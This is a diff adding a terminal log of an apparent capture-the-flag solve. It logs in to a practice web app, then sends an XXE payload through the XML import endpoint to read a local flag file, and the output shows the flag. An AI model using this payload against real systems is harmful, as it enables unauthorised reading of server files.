@@ -1,0 +1,12 @@
+$ curl -sS -H 'ngrok-skip-browser-warning: 1' \
+    -d 'email=supplier@nexasupply.test&password=supply1234' \
+    -c cookies https://written-wince-resolved.ngrok-free.dev/login
+HTTP/2 302 location: /dashboard
+
+$ curl -sS -H 'ngrok-skip-browser-warning: 1' -b cookies \
+    --data-urlencode 'xml=<?xml version="1.0"?>
+<!DOCTYPE products [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
+<products><product><sku>&xxe;</sku><name>test</name><category>test</category>
+<description>test</description><price>1</price><stock>1</stock></product></products>' \
+    https://written-wince-resolved.ngrok-free.dev/import | grep NFX
+NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}
